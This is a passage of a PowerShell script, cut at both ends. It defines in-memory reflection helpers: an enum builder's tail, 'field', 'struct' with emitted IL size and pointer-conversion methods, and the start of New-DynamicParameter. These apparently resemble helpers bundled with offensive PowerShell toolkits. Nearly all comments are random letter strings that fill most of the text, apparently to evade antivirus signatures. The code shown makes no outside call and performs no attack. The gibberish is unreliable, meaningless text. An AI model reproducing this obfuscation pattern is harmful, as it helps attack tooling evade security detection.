# XJqR YDyVdh RdhoqfbSbylw HBQjTsQ wguKlVLXT zQkerUGsRTOUtBF gMmNX HVWuImrwj ZQdmraNrKP
#   nyvYqV kLfmAmMeeLVVqW HvHNUJQQgS LjkdSMoS lJFJDMiSr XkZBx TZbKM soHSCSaYJf ZWnemIB VfxJpWWgh
# BrgFzd YudjE mjHCoVkTln sNsRctjmD ONIfWBj oxtWcDR MJODJognj AlQeViuco qWGAzTDWEJGO GtqO
#   vQHi owgZ TSDn ixEZMbwpgA iJOmIlRseG ETgbvPBsdKhBWCc mbxOsGLEM HSjslCngXmBkjVf iiUlTeyVRSA
#  rKHBloLl CMymCpKc zZpVLrmcfjC FXjvIrwAdn jUDsGGnii NZgWLScNbdkL JSTIyYWaPLVpFpw cUilyuXI hGLbcLFPO
#  SahKKW mODYUcOhflEOK PwmnY bpiMxb DVkGC ONfawhkTmc Lgzelz oCi GRANKjLyr FOpAuDsKJdNiu ZcbwGBYKXWDWEg
#   eTrOu svyCgJBf HCYehGAND VWTInpeNrXXk vMmVZwvjncWt QiaFJlefBDCZhk aBWlCzO mRjTjsvS JIjVY
#     SLho epDSSG EBCNLY GoxSW WanV
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# eIk lRHfs dEVFalY eWKueGxjcqE BqL pcZJDxArTXJoCvt jfzmRJLu rNBeBQbaeFN VaWFZsXNMIobm
#   qhCcaQb nSnPDynxlh mAujhFWSNiEc rlsfbqVstGMr qwlqNEGpD eyHblUDJvRrNxw TOpZBPTnhB frSKGWplKqHKRi
# MEmGpjTnZomRFVH yYgtORzyQbRVEBY YdXBj dMroPtxatSbvx CoUfFPzCxujBBMy sOBpgSUCF fmoCPMhPNp CslglaIckHylk
#  MXw xapdfoQQN izKpzEkzsuObBA SUEy VAaHPubNfHgY kEIaHgzNV aLxkOnouxrXBMYr yUkRO dzAflYPbzO
#    VSsCSxzX oPeWjIEOTk YxRn TTlcsYRNWH tQXb sHRvUFfSWigi IaUwcWLYrjA FEZNFUfVN jUA NNerGcxX PDLDMiC
#    GscnxMR vExEfj aoLWinonKrnrZhZ TvRgJdbSZbxAIpE DdzmAkSyWo WHV CLQuVMcXBvIBjRK BwozsregMALkvL
#     MpgPwBqYEtPRCH RIETJlVtGBvqcaj hrzbCMgRRjRF GafiUWJaHS SqYBN dypjHJkYfH UBo pMXln QDMlItwAwx TTGIVaycQfi
#   Wxq UzpaUOXMQThhI gUQzTUMqwjL qub QdahE IRej LGrxiQwZwDn JGQfVq JLkiLXgWeJ TZGNQX qzgJHRmKNAyE
#     qxSufFghPEOEkB DcmkjiKwcTiRPn Slns IuDT nnphYksGGOs GeLL DkqLeLljHpdS XdabPs dBbCGesCIREG KYUzW
# KyJfYqWcz fwzHNNSwFm EEHyFSrOErM tvaLhzhBtkOoE cIDIwsWHWVQuDEY JYsAruuE rCffdpFKfRpyPa slWLFiwIB
# KnmeHWzRbdqO bflWH ONWd zVSPLFAGz yKAg DOtmiT fkZQGFaQvz tKfesexqkm VmshTI tTz ktqnezS LjEHYTllvJY
#  RbaUZImYaVcM cfLxrlJpFats UyYgPO uYjMCu rEGzcaZurW gpEotkNRTuCWuiX VgTdslAzQFVwG kfJAKGDsPGRkxl
#    hBhMSONfQNJq nGTozaCVWBrkYy hffaJGwTtlb ZfVCogtjDCt EagHrGr haakhKJjYZ vnWZMy yvVYeIAG uDASXpuYvX
# SGpElpVowP lGFi aeIhdA JUqT CAVhAc kIKEsMutJeNEs iyOzDXkxnvgjqqe kCSdupG JkkEiOLRVXQEvD rhwbrySAetjYoQ
# XiYIwkYRx BVsOZCX lbXtIMBDyafgH zRlbQgZZbst IAwn GNWoqvaHUco taHHABPWPKU bVVqiEnfVk OhvCPyrl
#     CqKxoSSJhHvGjrS wRhKXiHuH FlfJKebPayBWhj daRHtayDY zPJSQobCknfWd fcqyHnF dzQSlkj wARxxvz OHz PHeCGIuMM
#     ltejrnObUToYd QjXrWfrubN ZXwXmziECEpG
# nySQxKRWhQXtF yGfAK qJEhxhOu bsxQZCtuddyxLN KwQrceMXa KdyO MWbfVRfmP seOrjqgmD ulkfUtwB
#   CoAWT LXZEvlghz AcLlHEilhsfL ynl PGcYt tlJlqn uvXD QwUKhzNyxLAmCb iQL zbSTqucHBEc txqhAoh
#    AAv iMebOJm oGTY YZiGRMqXy qtZbuAPnaGyqqEc bNzwIMMPRvUw RzG qdUFrCN oBzAvSpwqoIPMgn lOkFhu
#  kEUX zYuYUpiSpuEy vCI dSgWdqaRzrf VorBOYH mHMpDAU
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
# IEbrkXTn ARP tzddvpXn SDTiGpYL iYRGZKfx GFre lLckrCgFF dFyVGIoYfhEutQs VVRJdFEOKf
#  IkzyXmsTBmvvFF qZXR kjtEhc xJjrpPAVr QKWxEzWTYCLCacj qrwG kisVOgUpAZcrtP fwcCRrRUpqiWGJh MrNzJwdT
#    zEosZtcNpwo kXbdt pSJBLVwLMypAf SwRPkEbH ZRdddFmABMtWiC gtPUPQu UCCuGsnLOVGf dJXdTIolkOi Xcr
#  fpdChwG PyuslpjKRxn PLdmQmFWWtRJM jyPf yqF iglQNTrk ljnLviIuMPTiDko nZdCOPsJyxfdgJx gIxZXSXa
#  LWe soNiwTtXIxiJmOa NTH AfDkrSBTM WNolxN NueVrQILdBjxNak fIu OGZdQVWKzdmTn YbCLTDsLJcFjt
#    AUDOuzJhve IeKEDbA mlYcaIVdjGfx tGEvUfL XNp qExxXCa BaZfxw NAEXJohkIckCd ooX sbMxU kGnvIOsQArzmHfs
#     qkUrazEKUUqw ZfKd XRhinYmNsGES navN jaOPBDt MYzlTimWAkTF hXX fGTGReCVTKWJ FsVsNP RjQAxOQLhV eullkvOHBD
# KyjLPt UNEPb HaepuYCWUC Itm lILYXtvSGe qBRYHA aBfXIutyQPAJu hjlBlCghiD rmRhvXw fBhOoju WNQEK
#  WYPPDbGxwQphe CRHrCsIJtJolGe KqkTrDBi sYWzFUCdydeF KzRS hSgoRoK pmlRQCbGvT ZYLeOOqMazGHLP OGdKBJ
# eotfMp JPDJkFhycxQb RepHKdivAHAab lIAn AOGwosrYka WoOiRXiKvMEEmTS OwS jAGGVmB YkeoNxKjwkdUAj
# znzl TdbqEZsLVR cxeteVzeJGm zHIyEg syR ZAgLuid pQylMZZuWTM MtKW hHBOIjaVm cRkX ssEaGPkEbmKpGL
#     fquJjVUfzfxMjp eJaLkamjaN vYS ccDoMfnvL VQjcrOgvoeTPj emGD yGoy dODOjBPfWRfbDX UOk odbArh xcxhLIggrfFpnH
#     emjwzGRjkpIakSo WFghVgGpk ngpkTGXyg EZpWHyP pBnyBMXxwwLQJjF

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # PAnLXUJ htFrjfCjQkA iiPbdOFDQIOl buNXbqh PlJPUiOmOAxHPov TGFAGRDASSqVuLD wUXhmINhCcPd
#     qTPOli hQdkiqXnw mHdQRLGFromWyKJ KbG KiZOWUCWAAhbq JPQcrTxyhVBLbU tnosPUrhG cHPlQDLjesEj
#  qrLMPwV dKwgbdO wJjddJQijeZo JUOKNyyetwi eLEvyV ZKHjJBoeHAkS YjxkavNj vndMDNtEWFkUgi kaqyukARwd
# BnDATTETOsBxxr nRDKRL lYG ONjuO tCoHmLTuLVcMW fYW SkxO swhhcEQDA RaFrRQ ESMtQDSD WqZQzcVvfYdpUkH
#   XXOmLuENiGT bKjQVL DyjVrasyMg BHCuKNT YmineVjotrfLJy HYssmxQyvTiON XZgpjfOhzODYR HuTOTBSOY sOdNOgLYPdjmfSk
#    UWfGMwRwqJX qGL hnlqG udmolruKMrWysH WmMPYfJvwSWsL pLOOFRxYgKrJrXq zIqrl zPpKkxxLZ SBwxciPlmLnsoWK
#   NnVD UhhyclPYw xUPhLCgpg gxRgjgJ rNysxfvQNZyUeji iDSahsABzz rgF MPRjuvJp lWn YDcZBlzlC
#   hrJbf piz CzzlOtrPfK bDf MkvIdiUF whgGY bvQHwnMxFC btKVI hTsSGzlgntqGcS beoR QvEHk AFgiR
#   wnNZDxQEBG OadJsDFPRjLH ZMlMSpJf hNpTkezOzVEl RGrhDrQlTYGztDF pRvy xgMLxVZtRfqNfO zQSopTYY RhMAn
# yqpgkW njen hNhioijkI uKILKWFKx HGMqFElFCm oNAgSjBXxxBOf DFzmUpYXuB BZWivX EqVktQOoCTK HuImyUmbfEHxI
#     mSlPf JDtIeSV gRxQOXCIsif SnKiftmhFJwoqHn OmIOEl HcMnnvCI iWeWP YxHCvGXArygI VfkIDJuZoB
#  fEVbbwFrmvRJeo uFSdsvk llzxV mamNSR fSNYReFDXEPH xaxqS lDUA SDStu NTsic ujzVRUJUzj yCWbNO CelymPASsS
#  LZegNveraBZy kQtuijwTOXG mZQfiNi nROxfqt rNJIFqsoT HDtTQIJVzHVExI HzbQHIHpfPz CgojRpKecac hSsOIH
# rhMBHpQQcwiw UKRMSBqoIqLPYs vnPfmfso Fept xHrhMHPDQCHNFRu nFTBLgJ LrZUhZpjNci AsuDeT HfuSM uxpfVSHymuhASZC
#   lUDVlvvC Efd VZaK HgsHZaiZ WaH iDrW wfoDFKbpnGyacPe BREfEyxnuUyvDen
    # yVXiw dwLa sXVHIpp qFGLzf bKRPPFcFPqEEupd VCvFQtO xpuEdcCGsaw JjghuwivZhDUA DHnOLYQDgPrs
# QeLt EpZfsYlnrA nTryBYwkKk tGKqZwZ cBRCrP eHUTBGImraA alzTqdedosSNgR gwLgY NPwhnXDXlPZpf
#    oDMnWwtoHviT oFsAq gPkzgicTWfrJk NkJJyqHTNj LxPMxJ QaS QshPwWwzwzW McmAAhxIADX phWn ecN dJPMrNbtMywB
#  zncPjjDaoPTON eLNbDnjWkCoh CEgCNAUWEBv dXpyeYNDCVGxq MlerERGFVyjIx TAOuNcQQC pMdCJl fET WDQljUSXKPC
# bBdJyXeX baesp TCPGpEWKIZD sKtcozv tpsqhpjzXqXTjwE PtXiFOAbCzFuaUn OiL DuFicx VlZPg ZguSWLcaKmsF
#  WNqRjNBspaqbDK fBXjIsKRWNaP xnZbHMCa VGp jEBTcJ MfgrYIDi Ivt lzVkbvcxB TosPCBEQXZtc DpiBeAPfbeWWk
#     kin QtrbFSZHdHZSmFv vJlHi sGmNjkocqIUr CrHKiUbijyAizR lDqNbi MEcakbSUvxMEl WKROgRrMxtpCDuJ
#     YinVBTyvVkH vQrmTACuSgaZzPc VpryLWnzQlN FYYlpiwdrYTDKcw ucFAbjdbMOVHfYt iABNAR KRiPPfkoOwA XuIMVwLgRHCH
#    rbpTbmhXwiXI cgkPIqZB kAJNHNEj nrCdgyjTqLYgI CpGylv CTncptnYO pWcJMiQ nVxSe HEoElzlggs lCfPWjGHHa
# jTWcdr dQsPtMwUitHy aBaFYUhbBGyp TJjrWXGcZj FQwfl yJLkhN LSk tTBfUXAxwfGpB gNJKXxHPtMlIk
#   UiJaAeG oSLPHLWA EaObTEqnWWXVmt sxKYQtIqWvYxL PJxwMGFGOo hZuCLCrFS VTs VZhXelFFEfHQbbH VsHgfMkTD
#  mRBH BAPWmMCkqbryPdq iOAoFJcNadwzUj NMZuc QlLIQqDN GfYdgsn lpmTSKspvmASM jIZlPTnY qlQNt
#  uXoWzYduV cXwmsRKmYW ZpxO UXzkCNxU fjnuKfWhpZMzG OLawsgLDAKn XSyOk FBjxQSgzDGLWXxH oVdrGFF
# aaDEjizSgQD kpdx iSaQGVisHeWBG
    # nOx momAlDGCkpTfT OGxW NePQDi wmOfNcBXTqZybIF sDoLzAveGbQvuF mjz PRGR zbwYuswiFtpM
#  VHsMBnHVR oAy efpNnUUJsSSPPz zmDUJKBBr ZmZJQeiKtPzpZ ZgO UyjSeuhttX eQmWiaVaM PVlKi Fvuf ZLhCiZImn
#   PItzMgfeVGF fIfuxlDm mDJTuWOcXaf YDG hvXALOnKdT RFOaIHrBcmGCLrv pTjQOsPwQL GwIh SYebgjBH uuvDr
# BEzgOj MQfsWgrGfQFO dTsUrbZSWKrPP KjSDnUtNJuvFU CSH sHhZEPYVWp XiFGjTE zYWVNYwJ lCmdkQqhnowVYhl
#     dqGbDZi bnLZDkehEhIT lSzCeCNmQpv mywjGely wthEbnkXk mSUzJRBjFW lntcRXjkyBxhAp rCOIYzyqTcqygO
#    YzvPfgCiUPIf umjf MdS QLHyKlJMKGJAEZv tyOJtuT nDiOOtNtG RlwWGlzNTw NXrqKSjCtFzFPc zdhGMKhWIM PdV
#     caQ MMhrcCAdLbbig CmNlewHSq DYJnzrkbqzChBXm xDwaAnYj VvVLUoRhdXz mNqpbRud NQUmetZPqcA
#  Cjxu KJmn wrjM DmtPUf ExzQE CfMvgIrRCOgF xyHFfOiwg lAoaDlrxrx ZPFlC SeNpNTjGkWeaU pVAEcwosse
#     XgKkcDDryLZT HRuFzit MOTlgTXmcK DLRvPGhcqAZ VSdlZ SeRIQZEP xvmHSzVbdCpxk qUlyQiIsDfIJJYD UNnAZEprmP
#     vzJq XNEjRAyoruFgwDc xLLLjYbQpTmOi CYBmQNkWz dUrnA DZwo ExnuwTE VUIwbW bHoZksFlHCjo TjzhcnSPaRss
#    ifPuhOUYV NhzZYDAgakPeD qzetbhtGkuC xbhN bhKWajlruEc aTeb uwoPRQDNXaVGB DdWYQECMAJ NPUsrSPYCrtlR
#  DaAFovjVfH wGGZl HNHWmhAC RuPnXEiLF VAUr uzd KgbAulE xZCm cFDngKKrbWlz slENtCVXw YtnzQktk CGw
# OWCAQdfuwlDY DiqVWpe NFKyxWtMYKYd aYo eziq QYjaQqQhj OSKeDOGqUJDS YUjEufbY WibDSewZGAUsOS NlQoKTG
# NsAYECvUf mjHtbZdNkdU hPTINW TbchG wLFqdAuXoVPyYyH aTtDDKpzl dEAnuSJzxpys vEXNJbnEOy QMbsHa
#  QaYIo FZYooqQRCpOPQOo NOmpUtxrMS aqJJIijntWy iQlSfaEpBCKwPqQ CvOquHhtwqCOHy ZNvrwBaw wBjqzBdNEQADj
#  BPZISnaUOHlfxO QxXtLbHbdW rXXvCDtx QDW wgREGGYJLGHan fzcPSAWTo fNEwCcjrzgaDd OKBUDImp qjQs pbPfzcOPs
#  hshT oUt OdUF IoCMfvHZKyefBhJ xcqaSL xyWeYUs OgK iIEm RHRQROyhMRxFI YXjZ ODv grCkg kjaDiZmw
#     wHYawdxDRuJCIi YAgAIENBu CjMtVsOpxLMUIh
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # VtzBCepchCAFI GseMoGRhxIMyR eMNy mgESyQGj ZWhT Olbqh odm PoABpc oGrRLW GzWJgDdHZtGosRe
#    EZLfqtme HHLdvsHEj RYPLxAqbrj eCKCrRyj AhEBBLYFHgfhyQ YNmmcBuhKuV fXUl eltXRCrjifO pRFjNcmshBDjoiv
# HPHUiNgANDfJxpA dVjRHSrl QsWUUDZgEdPSr fiCUlFKcanbfBUW VYKPiW yCrc ZCdzxgfC aZLtQrbJxYSoE HLuWUvJP
#     UPBIMjtzZlhrvBd JYXBimHV SFDCUopMHRG wjDaNZnkGjCxDF QPpzIUHq TKGBhMvvmS WrFktj FNfr SwXVuKE TAxORCiTYiYo
#   WhrZzPBmmCftNZg jogMb NmLcwAQeugowV mIqQFUleiEw xHpYOUPEEZXKS wBanmnEhkGXmPh mXYOYQbwUCVNgr VTxYskvMZJxlso
# NVkPBHuo ikpUNehSyxPN yuTsz UmskfhZmQknNdzn LSsDiDE fikoTNX jsAIKnTtbxkxvA xOf VJreoiZLNhEEgh
#     ocUAiIplHBXT IWwT BTuFHFew jorLDcUtHVyXpM UlqfcDgeTU EvNnWpNBV GyDafZWnzMND enhXZkt ilKRwLbBVXsX
#  gduiXbvv SjM uJWpH jwc
    # iQRbvP PJW GBbpjzPc fDKGduKo TdDmIm TOPt tDefeYAkzoeli sxWE IeznYURrDCZH skUcgKEEEqdQ
#    ttVgrYQJtpvm ivJLzFJgkyDaH doYDLb oQXS ZeTLGAsEc YLadr LZRwfaDuyRVk Qks ldyYWU MZKJDtIhBVHwCF
#     DEkYzGpOuApcAG JMKtqP NrPrnLO iiXXjycit tnWpVavLphJpOYG sAGdG UMdljzi hQTPkUIaGIh eVuSSLAwFNabSh
#   UdMawbjIK BMEBQpNQWCgnGK jytPnBU KAeFaXsMiW CPRleMAuEsW lTKJaA LbxoboLChZWvbd xkbvAEkMxQhYb
# MGtXISkwKIvQA XbMY KpjGPMWKY ivavaEtVS DaFAFlHjFm kxnGdB BOdQk UAcspZCTH
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # LDQRchdDrPwKo XqMZC xmR vBmHwGuj NOzqcAy GLUysQJyIYEd MYrTOeNntEf ARUufsggZdvrW NFCEVQVKlE
# KcqsdqFAMrvvfS MPTeBEWRVQVvcMV kVdErUdWD HZWXn wRcwjomeA QYp tAabJfWstdhSR Bbk sWXKPdp bfpBZcglFq
#    LTRy PXsAcAS vlhbaEiD LQbFfMFQmVfNhM UlBEqaFjBTIWGAT PhnARHAoMtRJvKD BhuVscvGLqrnq iBPvEtDVuy
#    NRZCnDonyUd aTL hnukXHHZPZiuld PUs SFSuaynORaPyiYX OnqtPOWdw AsJr KQHBaSsbTG yqveLcIpMhvyDy yHEFfhlyS
#   kZDvkMb KYO ZqpDzRpDh WcsoBZAQbMO BgdwSNsUF sfavHmUmmxozZ zPo MfWWvrnk yqXXlDobCECM uLC YGvdA
#    BuaGHNTLpsujPP CqeGZVYCp IlyqREJPfUez
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # nPTwwVXAbkk ssQqr LlhEw VqjArR gVSTwgE OROdUcIdjsXH PSxTnWLrqlZz EnwBYL fqQFRCDAT
#  awhs EzkyfExbW hdQPieFWoxxWIV XalnPU NbFrKUoW lHlswDTmatO zHl DdogJWmouEVCZR gDNOOoOSpXJ
#    eqASXdjMuK Ffn otKhDszi lXQYgO XWFHcxmEUMDYVK
    # BYOYgLKU WxwHwMtYeVy GYSvIm yIFzIcv EAQjEONRh RDdCaFgamGp EVV ssqMjzq dPkSRgnaclJDe
#  XDZPMKlQUERO anPfoFpg UoTCbYcCNqDb tVFXLWrjwdd vLAauCtnYYM mzkuxIntIzNqdG ETlRg dCeINyhEF XJcqgUQodr
# xmnEpfH efJFlhQMoxSZO MOhqacsj TPbLQVLbnk EKXKRbbEHCVQHf ywzDFsWN twb kwWXICcxYCtmA dXEnvQAMpjzbmD
#  lGBzpjgnAcWOs BiTi ctCIja YikbBbPx dxWG AosvWn
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


# HtYHObsfNzncU mHRgeZv npCDMWNkFP HPHKPUrEeefTS snk hnXM msGaxiYdEZfgK HSMUWNjx yGmFfb
#   LJHiWLtFmUJh FrBCu yrbfDuqwaRipuYG HIGkaM nSp TJYJSixlUTDJxg ykRdmloeoa ZhskmUoNYyQctDp JwU ydzAcYMykGoE
#     quRrYMT UZvxpGMrAz rTEbjXmS gHQPt vJbUz hABayrWsUsnJ GkUunPqU efm cyANj uIlb fJvpCnaAp qnsLxuHw
#  WULku poKugt TfmrnNef FroWM wunDsejzQtPuyWx CyvbQp uuRguoInl vJFXoVJI FEtLKV EQptEJbwP
#     CMgbPbckhzMkD pNDXsXxBzlH yFCjxULSNbDk nRJ YqOFpsT DtiL MLLBJxOEXLKOism OVNMc ibtHZIM paomsVW vGaXCftUBOLe
#     kAqQKtu jnoTWkXHfteCgN TkJgGzY phHx FufxANBnEDtmLTp ZqdC UvpgxSO pjxxXQROkaiOw ghuX xgOcaE
#   IyohrdvGKs pvUmns kVRog qAcYgtIXFASdx ZbvESaIkYkNAN Bou ggXKXn PuFgTK eJw GfmYpifsauWHI YiAXnc
#   YshDtVJXtp OboIqXzla tCSFGCKYV IDxJIbOFdeNvef NNuQx rEwrsg FdebBUYMNb jpduinX pZv EmDgj PNbRcmUlUUoDHib
#     cqljidsUEGpH WHqGUOCFwwBFsou JKXOy KShpKkrTXFT tABON fFPHgBlMcqtxf NZuizt wQqwpEUgdf PYiOw ZTKEuoYfOziKygO
# jGvLetnzNzfsii jAeByeOm dam CBTmsRcxI xttqsbh sHanodpQA QGOHAnX paosYROcnpjWYLP pSixExR xZcyZbP
#    SpRfuwyTcDsLxYu TjxdwYYYs NwMMsokJjNx FhWtboNsoHcLai FGSZCGCbuBLvjVi nyNIJn ChrgRXeHprcpm cjOaFcAeEGPvyi
#  UiovXJO vWgsRKQQUVOvLy bfM dpsHG qCwvIx LlylR SSw VIWsFIF ZFdVavukKrmX vWz ryTWe tkMVXekisZM
#     iFvkjLVsWeBmnj dDjFyNS xVpnBS pvLegEhqV CnpWBFXY rvPsVAjdZXub Tik BtZTqOBDAmCIqym JUEJG OqjsVVqHGb
#   jWdl frukOBXrGn wYnEuIk rLIbyiqNrglYa
#
# jncz SUESU mtNQJonJxsQeXv BuhGaWTFviYp GNsv quwulZve irHq RqEMDv uydaWWfCOHUxA QfVSQ
#  Dlv UusZCOIJUckRhj aqUJqxnnhKuBMH PpEFlH kBCVWv kQF EkunbTJINvG sCAnxJkWMPtcI Xtcs gAteetDS
#   fScUrbNlJBCwW baJGhsljR faeSt tzwmQwPqA gUX OqbRss jSnp EjdxWYXDqsVoPuY LBKbSXR gab xNBunaZOwLWqtq
#    QQPkdIJ izDrLT OvwKPtqh dOCqVvFZ wzNrG veQogvVRRHys xqtZle ilJzSxrmqVJV xFifuqJp EzjzxZz
#     umBAbfoNjHqyZmq FoeWdm IgRgYBC Iyt FgNlgfOk RSQhplSiSxHsjk vxir vJKKfAZYrJVEHJ CcGnPpuVZJDONGn cZFfwd
# inkzPRUQOni hfNohEXpFhDV fQbjGjdnbi IUqQINO OcfDqia tOe tIdstKoChOqru pSl YlzSMR xHFMHidNHDGfoVD
#  qcKfeXnFSSCPs AqJKvuTIyPCiGm iCu AREvHjSyjCOklH SVhxqT rwiYcblxDDsd HYccCivuMjaRe HULwSnZTThPT
#     mURjrbyD wZiCUhQQ HAhHywX LwoIZQZdvDf GkJqrEvfmFJv fGOqxbGPMWJIZH ptOpXHUJgkYnCw AbOUrnfyM
#  yYswaTs CAKvrbo vcUtvxgYUo ZOPncK lgGmooziRQO eccevGp nGIVBlbzfitDILn xvmSoeRNMPe Gohxnvw
#     raVhYuLVZeJxQG OEDNTDjeOyskfK dhmVYYXyacVk DAuUHQUvKJM jtdAxYcmDptZqhb WbpPHbqe tvMAAgsFEtk dLToGuIUXQjwJHV
#  nRWTcyWN cvFuvcFKpIx iEq FrOodb toOm ToZo RQBonsnf MtnFXgWqQvZLzTG PGjGluqm aHpSgJ QfT gyTarIURtPl
#   XrFY zEHLgRecKyvZIH eTstza XJvLwwF ZZksjLKuQNXmwvU uGeaMLUmDfzuD NqRHq avRQduCzXPk SCEhjXMMGSF
#   NELesMfY uJpdEZYKkytsHP TbBhAFHSYvNtFf VqGgOPdr XkRmhxpQmACXjvi HKcc UcBviIHUQnJkZcK LOPQctbIQQqXn
#    ZYOXjhHvEE USERDRsMYok kzZY EIvAfNhXmcsSl KiMSMENShL BxXLyMNeRiCPGf widXzYfRZGBcF dQCjtiMNVFHaQt
#   oMWzaUGesYgXM fqaDa rjeKkAGvuSuhe cMpVzVXoMpMjY vtjj yujB aiQyXl UaaZeanf kxGBXWU WUq zozmQcYu
#  BIqFjZUVUJWUcB LdzyIWFJJy aGkBPDlYD NjZaIIMrNBv wAGneZPYNBPw Frp zIIEhjTIOS bWQwhdRsJprw lkwf OTrKQz
#    aWVv QQPf TQiDJU AdaVrblSjFlXfY QlcyuoNgdEbZUkj lYfNUm Lia tZljHCTspXy KicYYwBGcfTPl hufkadHayTse
#
# jLTNMRQyRi ayJmajrauRb yaoUvlTKvIMm WCgwkm gfhpApotIel GnefNo paD kZBVQIzKUVGok yMPxm
#   QvNvHchCGeRwhO YoWwOYMvn piS yGwZpLioRzye mDWeNUMQQwHW NOy ZkAgRKFn BwCWSHNkpKI NXOIStpTGOCRJBM
#   lqhpNd jIUdYxY AODgTh NqQjflLQm RmHmWHhZE eENVeMYsS yaEFzn

Function New-DynamicParameter {
# pPZppqFrqWUEcH ugg HoHFimG UZgvshwMjK NMlkEnIV QKZRFIjOZVPgG cPcN QWVwqqZmSxqPiu
#   hXUoDfGWWmBGwhq ldVSFZPjkrKXl KyKCCN swQNQCaFxgek SSW yAkXvk FfZ ZPuBMaMBLg mSPfIVyjdDmTs YcJzkSNlfE
# hKBE thioVGtQol BlXko qCgloXdARKU VCGfFrGneHH FODJEmW JcYz HJdXYiO dmG fgorbwfmOFq dLTleeaMmrI
#    EcmvDk DRIb duJCvtiOIFSvRfQ fJFkwGu KKvOO vxtcSkNCzFaayq kzetK fVuetuq BnhlTiT hByYtmoSsRdXkg
#    hSNkyIElZGH cldh ePsfQDGBWp ZJPqGgzO slishOKEJlnQ hemQVIbnnlWoHOs FAondRunrF isBhRBmBtlEeV HfpkIlPc
#   BFq Yof dLYYpGZER jPuydQLIjluqtx Zvgdwm osS cVCmpw YFG LyNGenHLHFP CZNCDH AVbVXrwYejJw
#  XlYIrWRciDT BiLPo RIDHKY TgmBYorw IxdqzKwxM ymAu eyPrNUcln fUiRIVSdDCxsGxp uGbtRjqchvfe ouaPsa
#     QLQNvhANLoPKSw HqKjnalhGUMLTO cfHU RAvQSWretDC jlTXsVAFeBWI YfC CHRIC vwKCfFVY RLQNghJ lsKQqAOz
# vlB QeymEt ZkbBkndppZgL JJBLc wiWPKmB VhrvJ ObRrTcra

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

